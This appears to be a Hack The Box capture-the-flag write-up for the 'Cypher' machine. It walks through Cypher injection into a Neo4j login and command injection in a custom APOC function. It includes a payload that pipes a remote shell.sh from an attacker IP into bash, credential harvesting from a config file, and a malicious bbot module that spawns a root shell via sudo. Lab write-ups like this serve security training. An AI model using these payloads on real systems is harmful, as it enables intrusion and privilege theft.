---
clayout: ctf
title: Cypher
date: 2025-05-29
image: /ctf/hack-the-box/machines/cypher/info-card.png
type: Hack The Box
ctf:
    - name: Cypher
      link: https://app.hackthebox.com/machines/650
      thumbnail: /ctf/hack-the-box/machines/cypher/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/650
          thumbnail: /ctf/hack-the-box/machines/cypher/pwned.png
---

# Enumeration

## Network Scanning

We start by scanning the machine with `nmap`.

```bash
nmap -sC -sV -v -A -p- -oN nmap.txt 10.10.11.57
```

**Scan Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 be68db828e6332455446b7087b3b52b0 (ECDSA)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

**Summary of Open Ports:**

| Port   | Service | Version       |
| ------ | ------- | ------------- |
| 22/tcp | SSH     | OpenSSH 9.6p1 |
| 80/tcp | HTTP    | nginx 1.24.0  |


## HTTP Enumeration

### Hostname Resolution

The web server on port 80 issues a redirect to `http://cypher.htb/`. To facilitate local name resolution, we add the following entry to `/etc/hosts`:

```bash
echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```

### Website Analysis

Accessing `http://cypher.htb` reveals a basic webpage containing a login form:

![Home Page](/ctf/hack-the-box/machines/cypher/home.png)

### Login Form Testing

The login form is located at `http://cypher.htb/login`:

![Login Form](/ctf/hack-the-box/machines/cypher/login.png)

Using the default payload `' or 1=1` we got the following error:

```bash
on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 62 (offset: 61))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' OR 1=1' return h.value as hash"
                                                              ^}
```

This reveals that the backend uses **Neo4j** and the **Cypher query language**, with unsanitized user input directly inserted into the query—indicating a **Cypher injection vulnerability**.

### Directory Brute-Forcing with Gobuster

We use `gobuster` to enumerate hidden directories:

```bash
gobuster dir -u http://cypher.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -r -e -s 200,204,301,302,307,401,403
```

**Results:**

![Gobuster Results](/ctf/hack-the-box/machines/cypher/gobuster.png)

We found a `/testing` directory:

![Testing Page](/ctf/hack-the-box/machines/cypher/testing.png)

This directory exposes a file named `custom-apoc-extension-1.0-SNAPSHOT.jar`.

## Vulnerability Discovery

### Custom APOC Extension

Decompiling the `jar` file we found the `CustomFunctions` class with the `getUrlStatusCode` function.

```java
@Description("Returns the HTTP status code for the given URL as a string")
public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
        url = "https://" + url;
    }

    String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
    Process process = Runtime.getRuntime().exec(command);
    ...
}
```

The function `getUrlStatusCode` constructs a shell command using unsanitized user input and executes it using `Runtime.getRuntime().exec`, making it vulnerable to **command injection**.

## Exploitation

### Cypher Injection

Using Cypher injection through the login form and chaining it with the vulnerable custom APOC function, we crafted the following payload to gain Remote Code Execution.

```sql
' or 1=1 CALL custom.getUrlStatusCode('http://10.10.14.10:1337/; curl http://10.10.14.10:1337/shell.sh | bash') YIELD statusCode RETURN statusCode as hash //
```

**Shell Obtained:**

![Reverse Shell](/ctf/hack-the-box/machines/cypher/shell.png)

### Local Enumeration

Inspection of `/etc/passwd` revealed the following users:

```bash
root:x:0:0:root:/root:/bin/bash
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
```

Within `/home/graphasm`, we found a `bbot_preset.yml` file containing credentials:

```yaml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

Using these credentials (`graphasm:cU4btyib.20xtCMCXkBmerhK`) we can login via SSH.

```bash
ssh graphasm@10.10.11.57
```

# Privilege Escalation

### Misconfigured Sudo

The `graphasm` user has passwordless sudo access to the `bbot` script.

```bash
$ sudo -l
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

#### `bbot` Script

```python
#!/opt/pipx/venvs/bbot/bin/python
import re
import sys
from bbot.cli import main

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

The script executes the `bbot` Python CLI, which can be extended with custom modules.

#### Leveraging a Known Exploit

Referencing a public [GitHub repository](https://github.com/Housma/bbot-privesc/tree/main), we just followed the instructions to create a malicious module to escalate privileges.

**`preset.yml`:**

```yaml
description: System Info Recon Scan
module_dirs:
  - .
modules:
  - systeminfo_enum
```

**`systeminfo_enum.py`:**

```python
from bbot.modules.base import BaseModule
import pty
import os

class systeminfo_enum(BaseModule):
    watched_events = []
    produced_events = []
    flags = ["safe", "passive"]
    meta = {"description": "System Info Recon (actually spawns root shell)"}

    async def setup(self):
        self.hugesuccess("📡 systeminfo_enum setup called — launching shell!")
        try:
            pty.spawn(["/bin/bash", "-p"])
        except Exception as e:
            self.error(f"❌ Shell failed: {e}")
        return True
```

We can now run the `bbot` script with the `preset.yml` file and get a root shell.

```bash
sudo /usr/local/bin/bbot -t dummy.com -p /home/graphasm/preset.yml --event-types ROOT
```

**Root Shell Acquired:**

![Root Shell](/ctf/hack-the-box/machines/cypher/root.png)

The root flag is in the `/root/root.txt` file.
